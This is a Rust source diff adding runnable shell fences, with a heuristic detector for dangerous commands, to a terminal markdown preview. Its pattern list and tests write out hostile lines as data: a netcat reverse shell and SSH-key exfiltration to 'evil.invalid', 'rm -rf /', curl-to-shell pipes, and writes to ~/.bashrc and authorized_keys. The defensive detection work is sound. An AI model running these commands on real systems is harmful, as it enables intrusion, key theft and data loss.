@@ -55,12 +55,373 @@ pub struct MarkdownPreview {
     pub selection: Option<((u16, u16), (u16, u16))>,
     /// True while a mouse drag is extending `selection`.
     pub dragging: bool,
+    /// Runnable fences (#353) and, frame truth like `anchor_rows`, each
+    /// one's glyph line as a VISUAL row (same order, same `wrap_key`).
+    pub runnables: Vec<MdRunnable>,
+    pub run_rows: Vec<usize>,
     /// Set when this preview renders a docx/odt document (#181): the
     /// rebuild paths re-walk THIS file instead of the text buffer.
     pub doc_path: Option<std::path::PathBuf>,
     /// True when `doc_path` names a MEDIA file (#183): the rebuild
     /// dispatch probes headers instead of walking document XML.
     pub media: bool,
+}
+
+/// One runnable fenced block in a rendered preview (#353): a shell (or,
+/// when the interpreter is on PATH, python/node) fence wearing a play
+/// glyph on its first line. Clicking the glyph types the block into a
+/// pane named after the document and block number.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct MdRunnable {
+    /// Index of the block's first rendered line (the one with the glyph).
+    pub first_line: usize,
+    /// The fence's SOURCE lines, `[start, end)`, opener and closer
+    /// included: what `Cmd+Enter` uses to find the block under the caret,
+    /// from the parser's own offsets rather than a second fence scanner.
+    pub lines: (usize, usize),
+    /// The block's text, as written.
+    pub code: String,
+    /// The interpreter: `sh` (typed at the shell as-is), `python3` or `node`
+    /// (fed through a heredoc).
+    pub interpreter: &'static str,
+    /// The block looks destructive (`rm -rf`, `sudo`, `curl … | sh`, a
+    /// redirect, …) or the fence said `{confirm}`: the confirm popup says
+    /// so in red. Every block confirms; this only changes the wording.
+    pub destructive: bool,
+    /// `{cwd=root}` runs in the workspace root instead of the document's
+    /// directory. The only `cwd=` value honoured.
+    pub cwd_root: bool,
+}
+
+/// The play glyph a runnable fence wears in place of its first bar.
+pub const RUN_GLYPH: &str = "\u{25b7} ";
+
+/// Interpreter for a fence info string, or None when the block is not
+/// runnable: not a shell/python/node fence, `{run=false}`, or an
+/// interpreter that is not installed (looked up once per process).
+pub fn runnable_interpreter(info: &str) -> Option<&'static str> {
+    let (lang, attrs) = split_info(info);
+    if attrs.iter().any(|a| *a == "run=false" || *a == "run=no") {
+        return None;
+    }
+    match lang.to_ascii_lowercase().as_str() {
+        "sh" | "bash" | "zsh" | "fish" | "shell" | "console" => Some("sh"),
+        "python" | "py" | "python3" => interpreter_on_path("python3").then_some("python3"),
+        "node" | "javascript" | "js" => interpreter_on_path("node").then_some("node"),
+        _ => None,
+    }
+}
+
+/// The fence's language word and its `{a=b c}` attributes.
+pub(crate) fn split_info(info: &str) -> (&str, Vec<&str>) {
+    let info = info.trim();
+    let (lang, rest) = match info.find('{') {
+        Some(i) => (&info[..i], &info[i..]),
+        None => (info, ""),
+    };
+    let lang = lang.split_whitespace().next().unwrap_or("");
+    let attrs = rest
+        .trim_start_matches('{')
+        .trim_end_matches('}')
+        .split(|c: char| c.is_whitespace() || c == ',')
+        .filter(|a| !a.is_empty())
+        .collect();
+    (lang, attrs)
+}
+
+fn interpreter_on_path(name: &str) -> bool {
+    // Looked up once per process: the preview rebuilds on every edit, and
+    // a PATH walk per python fence per keystroke is a syscall burst.
+    static PYTHON3: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
+    static NODE: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
+    let probe = || {
+        std::env::var_os("PATH")
+            .is_some_and(|path| std::env::split_paths(&path).any(|d| d.join(name).is_file()))
+    };
+    match name {
+        "python3" => *PYTHON3.get_or_init(probe),
+        "node" => *NODE.get_or_init(probe),
+        _ => probe(),
+    }
+}
+
+/// A block that carries a control character other than newline or tab is
+/// never runnable: a `\r` makes the typed bytes a different program from
+/// the rendered line, and an escape sequence can repaint the popup.
+pub fn has_control_chars(code: &str) -> bool {
+    code.chars().any(|c| {
+        (c.is_control() && c != '\n' && c != '\t')
+            // Format characters (Unicode Cf) are not `is_control` but do the
+            // same damage: a bidi override reorders the displayed line
+            // without changing the bytes (Trojan Source), a zero-width
+            // character hides a split inside a word.
+            || matches!(
+                c,
+                '\u{200B}'..='\u{200F}'
+                    | '\u{202A}'..='\u{202E}'
+                    | '\u{2060}'..='\u{2064}'
+                    | '\u{2066}'..='\u{2069}'
+                    | '\u{FEFF}'
+                    | '\u{00AD}'
+            )
+    })
+}
+
+/// A small built-in matcher for the shapes that delete, escalate, pipe
+/// the network into a shell, exfiltrate, or write outside the block's own
+/// output (#353). It cannot be complete - README text is attacker-authored
+/// - which is why every block confirms; a hit only turns the popup red.
+pub fn looks_destructive(code: &str) -> bool {
+    let c = code.to_ascii_lowercase();
+    let fetches = |l: &str| l.contains("curl") || l.contains("wget");
+    // The redirect scan reads the whole block: a string can span lines,
+    // and its closing line on its own looks like a comment.
+    has_write_redirect(&c)
+        || c.lines().any(|l| {
+            let l = l.trim();
+            // `curl … | sh`, `wget … |bash`, `… | sudo …`
+            let piped_to_shell = fetches(l)
+                && l.split('|').skip(1).any(|part| {
+                    let p = part.trim_start();
+                    [
+                        "sh", "bash", "zsh", "fish", "sudo", "python", "perl", "ruby", "node",
+                    ]
+                    .iter()
+                    .any(|w| {
+                        p == *w
+                            || p.starts_with(&format!("{w} "))
+                            || p.starts_with(&format!("{w}\t"))
+                    })
+                });
+            // `sh -c "$(curl …)"`, `eval "$(wget …)"`, backticks
+            let substituted_fetch = fetches(l)
+                && (l.contains("$(") || l.contains('`'))
+                && (l.contains("eval")
+                    || l.contains(" -c ")
+                    || l.starts_with("sh ")
+                    || l.starts_with("bash "));
+            // `rm -rf`, `rm -r -f`, `\rm -fr …`: an rm with both r and f flags
+            let rm_rf = l
+                .split_whitespace()
+                .next()
+                .is_some_and(|w| w.trim_start_matches('\\') == "rm")
+                && l.split_whitespace()
+                    .skip(1)
+                    .any(|f| f.starts_with('-') && f.contains('r'))
+                && l.split_whitespace()
+                    .skip(1)
+                    .any(|f| f.starts_with('-') && f.contains('f'));
+            piped_to_shell
+                || substituted_fetch
+                || rm_rf
+                || l.starts_with("sudo ")
+                || l.contains(" sudo ")
+                || l.contains("mkfs")
+                || l.contains("dd if=")
+                || l.contains("--force")
+                || l.contains("git reset --hard")
+                || l.contains("drop table")
+                || l.starts_with("nc ")
+                || l.contains(" nc ")
+                || l.contains("ncat ")
+                || l.contains("/dev/tcp")
+                || l.starts_with("chmod ")
+                || l.starts_with("chown ")
+                || l.contains(" chmod ")
+                || l.contains(" chown ")
+        })
+}
+
+/// A `>` anywhere in the block that writes somewhere: not `2>&1` / `>&2`
+/// (a descriptor dup), not `>/dev/null` (the device itself, not
+/// `/dev/nullish`), not an arrow
+/// (`->`, `=>`), not in a trailing comment. Quotes are honoured, so a `#`
+/// or `>` inside `"…"` / `'…'` is text - otherwise
+/// `echo "step #1" > ~/.bashrc` would hide its redirect behind a fake
+/// comment. A backslash escapes the next byte outside quotes and inside
+/// double quotes (`echo \" > ~/.bashrc` really writes the file). A quote
+/// that never closes (`echo don't > ~/.bashrc`) fails OPEN: the block is
+/// rescanned with quotes as plain text, since a missed write costs more
+/// than a spurious red banner. Quotes span lines, so the closing line of
+/// `echo "hello\nworld # note" > /tmp/x` is a redirect, not a comment.
+/// `<>` counts: it opens its target for writing too.
+fn has_write_redirect(code: &str) -> bool {
+    match redirect_scan(code, true) {
+        RedirectScan::Found => true,
+        RedirectScan::Clean => false,
+        RedirectScan::Unterminated => {
+            matches!(redirect_scan(code, false), RedirectScan::Found)
+        }
+    }
+}
+
+enum RedirectScan {
+    Found,
+    Clean,
+    /// The block ended inside a quote, so nothing after the opening quote
+    /// was looked at.
+    Unterminated,
+}
+
+/// Whether `prev` ends a shell word, so a `#` immediately after it opens a
+/// comment rather than sitting mid-token.
+///
+/// Whitespace is the obvious case. The operators matter too, and getting
+/// this wrong the other way was a real over-flag: `echo a|#x > /tmp/y` was
+/// scored destructive because `|` is not whitespace, while every shell reads
+/// `#x > /tmp/y` there as a comment and writes nothing.
+///
+/// Every member was probed against `sh` with a positive control in the same
+/// run (the same line with the `#` removed, which does write):
+///
+/// | line | writes? |
+/// |---|---|
+/// | `echo a\|#x > out`, `echo a;#x > out`, `echo a &#x > out` | no |
+/// | `(#x > out)`, `echo a)#x > out` | no |
+/// | `echo a=#x > out`, `echo a-#x > out` | **yes** |
+///
+/// `=` and `-` are deliberately absent: they do not end a word, and
+/// admitting them would blank a redirect the shell really performs.
+///
+/// `<` and `>` are absent too, for a different reason. A `#` straight after
+/// a redirect operator is not a comment with clean semantics: `sh` answers
+/// `echo a >#x` and `cat <#x > out` with `Syntax error: end of file
+/// unexpected`, because the redirect is left with no target. Neither writes,
+/// but neither runs either, so there is no behaviour to match and nothing is
+/// gained by claiming one.
+///
+/// This list only ever grows on evidence, because every addition moves the
+/// matcher toward calling a destructive block calm.
+fn ends_a_word(prev: u8) -> bool {
+    prev.is_ascii_whitespace() || matches!(prev, b'|' | b';' | b'&' | b'(' | b')')
+}
+
+/// One pass of [`has_write_redirect`] over a whole block; `quotes` says
+/// whether `'` and `"` open a string or are ordinary bytes.
+fn redirect_scan(code: &str, quotes: bool) -> RedirectScan {
+    let b = code.as_bytes();
+    let mut quote: Option<u8> = None;
+    // The last byte that the shell would see BEFORE the current one, with a
+    // `\`-continuation and the newline it swallows skipped over: a
+    // continuation joins the two physical lines, so what precedes the join
+    // is what decides whether a `#` after it opens a comment. Start of input
+    // counts as whitespace, so a leading `#` is a comment.
+    //
+    // This is the whole reason the flag is not simply "a continuation just
+    // happened". `echo a\` + `#x > /tmp/y` joins to `echo a#x > …`, where the
+    // `#` is mid-word and all three of sh, bash and zsh write the file;
+    // `echo a \` + `#x > /tmp/y` joins to `echo a #x > …`, where it is a real
+    // comment and none of them write. The two differ only by that space.
+    let mut prev = b' ';
+    let mut i = 0;
+    while i < b.len() {
+        let c = b[i];
+        match quote {
+            Some(q) if c == q => quote = None,
+            Some(b'"') if c == b'\\' => i += 1,
+            Some(_) => {}
+            None => match c {
+                b'\\' => {
+                    // Skip the escaped byte, and leave `prev` alone: across a
+                    // continuation the shell sees the byte before the
+                    // backslash, not the backslash or the newline.
+                    i += 2;
+                    continue;
+                }
+                b'\'' | b'"' if quotes => quote = Some(c),
+                // A `#` starts a comment only when quotes are being
+                // honoured: the quote-blind rescan runs because a string
+                // was left open, and a `#` inside that string is text. And
+                // never immediately after a line continuation, where the
+                // joined word puts the `#` mid-token.
+                b'#' if quotes && ends_a_word(prev) => {
+                    // A comment runs to the end of its line; the block goes on.
+                    while i < b.len() && b[i] != b'\n' {
+                        i += 1;
+                    }
+                    continue;
+                }
+                b'>' => {
+                    let prev = if i > 0 { b[i - 1] } else { b' ' };
+                    if prev != b'-' && prev != b'=' {
+                        // Where the target search starts if this is a
+                        // single `>`. A dup is spelled with ONE: zsh parses
+                        // `>>&` as append-both-streams-to-file, so
+                        // `echo appended >>&2` APPENDS to a file named
+                        // `./2` (measured under `setopt NO_MULTIOS`, while
+                        // `>&2` on the same fixture left it alone). sh,
+                        // bash and dash reject the form outright, so this
+                        // is zsh-only and append rather than truncate, but
+                        // the direction is the dangerous one.
+                        let single = i + 1;
+                        let mut j = single;
+                        while j < b.len() && b[j] == b'>' {
+                            j += 1;
+                        }
+                        // A descriptor dup is `>&N` or `>&-`, and the `&`
+                        // binds TIGHTLY: it is checked before whitespace is
+                        // skipped, and only a digit or `-` may follow it.
+                        //
+                        // Exempting every `&`-prefixed target was wrong in
+                        // the direction that matters. `>&` is bash and zsh's
+                        // synonym for `&>`, so `echo '' >& ~/.bashrc`
+                        // TRUNCATES the file, and it was classified calm.
+                        // Measured: an 18-byte file went to 1 byte under
+                        // bash, while the `echo a >&2` control left its file
+                        // untouched. dash refuses it ("Bad fd number"), but
+                        // croft's terminal is the user's shell, and on the
+                        // two shells most people have it writes.
+                        // And the digits must run to a WORD BOUNDARY.
+                        // Checking only the byte after `&` left the same
+                        // defect one byte along: `echo overwritten >&2x`
+                        // writes the file `./2x` (measured: a 17-byte file
+                        // became 12 bytes reading "overwritten") while
+                        // `>&2` followed by anything non-word is a real dup.
+                        let dup = j == single && b.get(j) == Some(&b'&') && {
+                            let mut k = j + 1;
+                            if b.get(k) == Some(&b'-') {
+                                k += 1;
+                            } else {
+                                while k < b.len() && b[k].is_ascii_digit() {
+                                    k += 1;
+                                }
+                            }
+                            // At least one digit or a `-`, then nothing that
+                            // could continue the word.
+                            // `ends_a_word` rather than a second spelling
+                            // of it a few lines away. The two lists differed
+                            // by `(`, which no shell distinguishes here
+                            // (`>&2(` is a parse error everywhere), but two
+                            // spellings of one idea invite a wrong
+                            // unification later.
+                            k > j + 1 && b.get(k).is_none_or(|n| ends_a_word(*n))
+                        };
+                        while j < b.len() && b[j].is_ascii_whitespace() {
+                            j += 1;
+                        }
+                        let target = &code[j..];
+                        let dev_null = target.strip_prefix("/dev/null").is_some_and(|rest| {
+                            rest.is_empty()
+                                || rest.starts_with(|r: char| {
+                                    r.is_ascii_whitespace() || ";&|)".contains(r)
+                                })
+                        });
+                        if !(dup || dev_null) {
+                            return RedirectScan::Found;
+                        }
+                    }
+                }
+                _ => {}
+            },
+        }
+        prev = c;
+        i += 1;
+    }
+    if quote.is_some() {
+        RedirectScan::Unterminated
+    } else {
+        RedirectScan::Clean
+    }
 }
 
 /// One local image block in a rendered preview (#176).
@@ -135,6 +496,11 @@ struct Renderer<'r> {
     pending_marker: Option<String>,
     /// Fence language + accumulated block text while inside a code block.
     code_block: Option<(Option<LangKind>, String)>,
+    /// The open fence's info string and SOURCE line range, for the
+    /// runnable check (#353).
+    code_info: String,
+    code_lines: (usize, usize),
+    runnables: Vec<MdRunnable>,
     /// Rows of cell texts while inside a table (row 0 is the header).
     table: Option<Vec<Vec<String>>>,
     /// Directory local image paths resolve against (#176); None keeps
@@ -233,7 +599,29 @@ impl Renderer<'_> {
         let Some((kind, text)) = self.code_block.take() else {
             return;
         };
+        let info = std::mem::take(&mut self.code_info);
+        let runnable = runnable_interpreter(&info)
+            .filter(|_| !has_control_chars(&text) && !text.trim().is_empty())
+            .map(|interpreter| {
+                let (_, attrs) = split_info(&info);
+                MdRunnable {
+                    first_line: self.out.len(),
+                    lines: self.code_lines,
+                    code: text.clone(),
+                    interpreter,
+                    destructive: attrs.contains(&"confirm") || looks_destructive(&text),
+                    cwd_root: attrs.contains(&"cwd=root"),
+                }
+            });
         let bar = Span::styled("\u{258e} ", Style::default().fg(self.theme.accent()));
+        // The play glyph replaces the first line's bar (#353): the same
+        // width, so the block's text keeps its column.
+        let play = Span::styled(
+            RUN_GLYPH,
+            Style::default()
+                .fg(self.theme.accent())
+                .add_modifier(Modifier::BOLD),
+        );
         let (fr, fg_, fb) = self.theme.syntax().fg;
         let code_fg = Color::Rgb(fr, fg_, fb);
         let highlighted = kind.map(|k| {
@@ -242,12 +630,19 @@ impl Renderer<'_> {
             highlight_text(self.registry, k, bytes, &line_starts)
         });
         for (i, line) in text.lines().enumerate() {
-            let mut spans = vec![bar.clone()];
+            let mut spans = vec![if i == 0 && runnable.is_some() {
+                play.clone()
+            } else {
+                bar.clone()
+            }];
             match highlighted.as_ref().and_then(|h| h.get(i)) {
                 Some(hi) if !hi.is_empty() => spans.extend(code_line_spans(line, hi, code_fg)),
                 _ => spans.push(Span::styled(line.to_string(), Style::default().fg(code_fg))),
             }
             self.out.push(Line::from(spans));
+        }
+        if let Some(r) = runnable {
+            self.runnables.push(r);
         }
         self.out.push(Line::default());
     }
@@ -329,6 +724,17 @@ pub fn render_markdown_with_images(
     registry: &mut LangRegistry,
     base_dir: Option<&std::path::Path>,
 ) -> (Vec<Line<'static>>, Vec<MdImage>) {
+    let (lines, images, _) = render_markdown_full(text, theme, registry, base_dir);
+    (lines, images)
+}
+
+/// [`render_markdown_with_images`] plus the runnable fences (#353).
+pub fn render_markdown_full(
+    text: &str,
+    theme: Theme,
+    registry: &mut LangRegistry,
+    base_dir: Option<&std::path::Path>,
+) -> (Vec<Line<'static>>, Vec<MdImage>, Vec<MdRunnable>) {
     let options =
         Options::ENABLE_TABLES | Options::ENABLE_STRIKETHROUGH | Options::ENABLE_TASKLISTS;
     let mut r = Renderer {
@@ -345,12 +751,24 @@ pub fn render_markdown_with_images(
         quote_depth: 0,
         pending_marker: None,
         code_block: None,
+        code_info: String::new(),
+        code_lines: (0, 0),
+        runnables: Vec::new(),
         table: None,
         base_dir: base_dir.map(|p| p.to_path_buf()),
         images: Vec::new(),
         suppress_inline: false,
     };
-    for event in Parser::new_ext(text, options) {
+    // Byte offset -> line, for the runnable fences' source ranges (#353).
+    let line_starts: Vec<usize> = std::iter::once(0)
+        .chain(text.match_indices('\n').map(|(i, _)| i + 1))
+        .collect();
+    let line_of = |offset: usize| {
+        line_starts
+            .partition_point(|&s| s <= offset)
+            .saturating_sub(1)
+    };
+    for (event, range) in Parser::new_ext(text, options).into_offset_iter() {
         match event {
             Event::Start(tag) => match tag {
                 Tag::Heading { level, .. } => {
@@ -366,6 +784,16 @@ pub fn render_markdown_with_images(
                         CodeBlockKind::Fenced(info) => lang_for_fence(info),
                         CodeBlockKind::Indented => None,
                     };
+                    r.code_info = match &kind {
+                        CodeBlockKind::Fenced(info) => info.to_string(),
+                        CodeBlockKind::Indented => String::new(),
+                    };
+                    // The Start event's range spans the whole block, closer
+                    // included.
+                    r.code_lines = (
+                        line_of(range.start),
+                        line_of(range.end.saturating_sub(1)) + 1,
+                    );
                     r.code_block = Some((lang, String::new()));
                 }
                 Tag::List(start) => {
@@ -559,10 +987,18 @@ pub fn render_markdown_with_images(
         .max()
         .unwrap_or(0);
     let mut removed_front = 0usize;
+    // Runnables are anchored to a row exactly as images are, so the guard
+    // and the shift below have to cover both. They did not: a runnable's
+    // `first_line` survived the trim unshifted, so an empty leading block
+    // quote moved the fence up a row while the glyph's recorded row stayed
+    // put, and a preview click landed on the wrong line.
     while r.out.first().is_some_and(|l| l.spans.is_empty())
         && r.images
             .first()
             .is_none_or(|i| removed_front < i.first_line)
+        && r.runnables
+            .first()
+            .is_none_or(|b| removed_front < b.first_line)
     {
         r.out.remove(0);
         removed_front += 1;
@@ -570,12 +1006,15 @@ pub fn render_markdown_with_images(
     for img in &mut r.images {
         img.first_line -= removed_front;
     }
+    for run in &mut r.runnables {
+        run.first_line -= removed_front;
+    }
     while r.out.len() > reserved_end.saturating_sub(removed_front)
         && r.out.last().is_some_and(|l| l.spans.is_empty())
     {
         r.out.pop();
     }
-    (r.out, r.images)
+    (r.out, r.images, r.runnables)
 }
 
 impl MarkdownPreview {
@@ -790,6 +1229,202 @@ mod tests {
         assert_eq!(span_with("code()").style.fg, Some(CODE));
     }
 
+    /// #353: shell fences wear the play glyph and are recorded with their
+    /// first rendered line and source range; `{run=false}` opts out; a rust
+    /// fence is not runnable; destructive-looking blocks and `{confirm}`
+    /// are flagged; a block carrying a control character is refused.
+    #[test]
+    fn shell_fences_are_runnable_and_carry_the_play_glyph() {
+        let md = "# T\n\n```sh\necho one\necho two\n```\n\n```rust\nfn a() {}\n```\n\n```bash {run=false}\necho no\n```\n\n```zsh {confirm cwd=root}\necho yes\n```\n\n```sh\ncurl https://x | sh\n```\n\n```sh\necho a\rnc -e /bin/sh h 1\n```\n";
+        let mut reg = crate::highlight::LangRegistry::new();
+        let (lines, _, runs) = render_markdown_full(md, Theme::default(), &mut reg, None);
+        assert_eq!(runs.len(), 3, "{runs:?}");
+        assert_eq!(runs[0].code, "echo one\necho two\n");
+        assert_eq!(runs[0].interpreter, "sh");
+        assert_eq!(runs[0].lines, (2, 6), "opener through closer, [start, end)");
+        assert!(!runs[0].destructive && !runs[0].cwd_root);
+        assert!(runs[1].destructive && runs[1].cwd_root, "{:?}", runs[1]);
+        assert_eq!(runs[1].lines, (15, 18));
+        assert!(runs[2].destructive, "curl | sh is flagged");
+        let first = &lines[runs[0].first_line];
+        assert_eq!(first.spans[0].content.as_ref(), RUN_GLYPH, "{first:?}");
+        let first_text: String = first.spans.iter().map(|s| s.content.as_ref()).collect();
+        assert!(first_text.contains("echo one"), "{first_text:?}");
+        let second = &lines[runs[0].first_line + 1];
+        assert_eq!(
+            second.spans[0].content.as_ref(),
+            "\u{258e} ",
+            "only the first line wears the glyph"
+        );
+        let joined =
+            |l: &Line<'static>| -> String { l.spans.iter().map(|s| s.content.as_ref()).collect() };
+        let rust_line = lines.iter().find(|l| joined(l).contains("fn a")).unwrap();
+        assert_eq!(rust_line.spans[0].content.as_ref(), "\u{258e} ");
+        let cr_line = lines.iter().find(|l| joined(l).contains("nc -e")).unwrap();
+        assert_eq!(
+            cr_line.spans[0].content.as_ref(),
+            "\u{258e} ",
+            "a block with a carriage return is not runnable"
+        );
+        assert_eq!(runnable_interpreter("sh {run=false}"), None);
+        assert_eq!(runnable_interpreter("console"), Some("sh"));
+        assert_eq!(runnable_interpreter("toml"), None);
+        assert!(has_control_chars("echo a\rb"));
+        assert!(has_control_chars("echo \x1b[2J"));
+        assert!(!has_control_chars("echo a\n\tb\n"));
+        assert!(
+            has_control_chars("echo hi \u{202E}~ fr- mr"),
+            "a bidi override"
+        );
+        assert!(has_control_chars("rm\u{200B} -rf"), "a zero-width space");
+        assert!(has_control_chars("\u{FEFF}echo"), "a BOM");
+        assert!(
+            !has_control_chars("echo 日本語 café"),
+            "ordinary Unicode is fine"
+        );
+        // A fence inside a list item: the source range still spans the
+        // opener through the closer, indented or not.
+        let nested = "1. First:\n\n   ```sh\n   echo nested\n   ```\n\n2. Done\n";
+        let (_, _, runs) = render_markdown_full(nested, Theme::default(), &mut reg, None);
+        assert_eq!(runs.len(), 1, "{runs:?}");
+        assert_eq!(runs[0].lines, (2, 5));
+        assert_eq!(runs[0].code.trim(), "echo nested");
+        // An unterminated fence at EOF still gets a range.
+        let open = "```sh\necho hi\n";
+        let (_, _, runs) = render_markdown_full(open, Theme::default(), &mut reg, None);
+        assert_eq!(runs.len(), 1);
+        assert_eq!(runs[0].lines.0, 0);
+        assert!(runs[0].lines.1 >= 2, "{:?}", runs[0].lines);
+        // A whitespace-only fence wears no glyph.
+        let blank = "```sh\n   \n```\n";
+        let (_, _, runs) = render_markdown_full(blank, Theme::default(), &mut reg, None);
+        assert!(runs.is_empty());
+    }
+
+    /// A runnable's recorded row must survive the leading-blank trim.
+    ///
+    /// `first_line` is taken while the document is being built, and the
+    /// renderer then removes empty rows off the front. Images were shifted
+    /// to match and runnables were not, so a document that opens with an
+    /// empty block quote moved the fence up a row while the glyph's
+    /// recorded row stayed put, and a preview click landed one line off.
+    #[test]
+    fn a_runnables_row_survives_the_leading_blank_trim() {
+        // `>` alone renders as an empty row, which the front trim removes.
+        let md = ">\n\n```sh\necho one\n```\n";
+        let mut reg = crate::highlight::LangRegistry::new();
+        let (lines, _, runs) = render_markdown_full(md, Theme::default(), &mut reg, None);
+        assert_eq!(runs.len(), 1, "{runs:?}");
+        let row = &lines[runs[0].first_line];
+        assert_eq!(
+            row.spans[0].content.as_ref(),
+            RUN_GLYPH,
+            "the recorded row must be the row the glyph is painted on: {row:?}"
+        );
+        let text: String = row.spans.iter().map(|s| s.content.as_ref()).collect();
+        assert!(text.contains("echo one"), "{text:?}");
+    }
+
+    /// The matcher's positives include the canonical install-script and
+    /// reverse-shell shapes; its negatives are ordinary commands. It only
+    /// colours the popup, so a miss is a wording bug, not a security one.
+    #[test]
+    fn the_destructive_matcher_knows_the_usual_shapes() {
+        for bad in [
+            "sudo rm -rf /tmp/x",
+            "wget -O- https://a | bash",
+            "curl https://x/i.sh|sh",
+            "curl -fsSL https://x | sudo bash",
+            "sh -c \"$(curl -fsSL https://x/i.sh)\"",
+            "eval \"$(curl -fsSL https://x/i.sh)\"",
+            "rm -r -f /",
+            "\\rm -fr ./build",
+            "nc -e /bin/sh evil.invalid 4444",
+            "cat ~/.ssh/id_rsa | nc evil.invalid 80",
+            "chmod -R 777 /",
+            "echo x > ~/.bashrc",
+            "cat payload >> ~/.ssh/authorized_keys",
+            "echo \"setup #1 complete\" > ~/.bashrc",
+            "printf 'step #2\\n' > ~/.zshrc",
+            "exec 3<> /tmp/x",
+            "make > /dev/nullish",
+            "echo don't > ~/.bashrc",
+            "echo \\\" > ~/.bashrc",
+            "echo \"unterminated > ~/.bashrc",
+            "printf '%s\\\\' > ~/.bashrc",
+            "cat payload >| ~/.profile",
+            "echo \"hello\nworld # note\" > /tmp/x",
+            // Fail-open: a quote left open makes the rescan read `#` as text.
+            "echo don't # > ~/.bashrc",
+            // A `\` continuation JOINS the lines, so the `#` opening the
+            // next physical line is mid-word and not a comment. `sh`, `bash`
+            // and `zsh` all write the file for this one.
+            "echo a\\\n#x > /tmp/y",
+            // `=` and `-` do NOT end a word, so these `#`s are mid-token and
+            // the redirect is real. `sh` writes the file for both.
+            // `>&` is bash and zsh's synonym for `&>`: this TRUNCATES the
+            // file. An 18-byte target went to 1 byte under bash.
+            "echo '' >& ~/.bashrc",
+            "cp id_rsa >& /tmp/out",
+            // The digits must run to a word boundary: `>&2x` writes `./2x`.
+            "echo overwritten >&2x",
+            "echo x >&12ab",
+            // Only a SINGLE `>` may precede a dup: zsh reads `>>&2` as
+            // append-both-streams to the file `./2`.
+            "echo appended >>&2",
+            // The two passes can only ADD a flag, never clear one: an
+            // unterminated quote makes pass 1 give up, and the quote-blind
+            // rescan then sees the `#` as text rather than a comment.
+            "echo \" # > /tmp/y",
+            "echo a=#x > /tmp/y",
+            "echo a-#x > /tmp/y",
+            "git push --force",
+            "git reset --hard HEAD~3",
+        ] {
+            assert!(looks_destructive(bad), "{bad:?} should be flagged");
+        }
+        for ok in [
+            "cargo build --release",
+            "ls -la | grep foo",
+            "curl https://example.com/api | jq .",
+            "rm build.log",
+            "echo hello",
+            "python3 -m http.server",
+            "cargo test 2>&1 | tail",
+            // The paired control: `&` followed by a DIGIT is a real
+            // descriptor dup and writes no file.
+            "echo a >&2",
+            "exec 2>&-",
+            "echo a >&2 && echo done",
+            "echo a >&2; echo done",
+            "make >/dev/null",
+            "echo a -> b",
+            "ls # see https://x -> y",
+            "echo '> quoted' # not a redirect",
+            "echo \"a > b\"",
+            "make >/dev/null 2>&1",
+            "echo hi # writes > nothing\necho done",
+            // A SPACE before the backslash ends the word, so the `#` on the
+            // next line really does start a comment. Paired with the
+            // positive above so the continuation rule cannot be
+            // over-applied: the two differ by exactly that space.
+            "echo a \\\n#x > /tmp/y",
+            // A shell operator ends a word, so a `#` straight after one opens
+            // a comment and the `>` behind it never runs. Probed against `sh`
+            // with a control (the same line without the `#`) that does write.
+            "echo a|#x > /tmp/y",
+            "echo a;#x > /tmp/y",
+            "echo a &#x > /tmp/y",
+            "echo a)#x > /tmp/y",
+            // A `>` genuinely inside a multi-line string writes nothing, and
+            // `sh` agrees. Nothing pinned this direction before.
+            "echo \"open\necho x > ~/.bashrc\nmore\"",
+            "if [ 3 -gt 2 ]; then echo yes; fi",
+        ] {
+            assert!(!looks_destructive(ok), "{ok:?} is ordinary");
+        }
+    }
+
     #[test]
     fn fenced_rust_block_gets_tree_sitter_colours() {
         let lines = render("```rust\nfn main() {}\n```");
@@ -899,6 +1534,8 @@ mod preview_selection_tests {
             built_seq: 0,
             images: Vec::new(),
             anchor_rows: Vec::new(),
+            runnables: Vec::new(),
+            run_rows: Vec::new(),
             wrap_key: (0, 0),
             last_area: ratatui::layout::Rect::default(),
             rows: rows
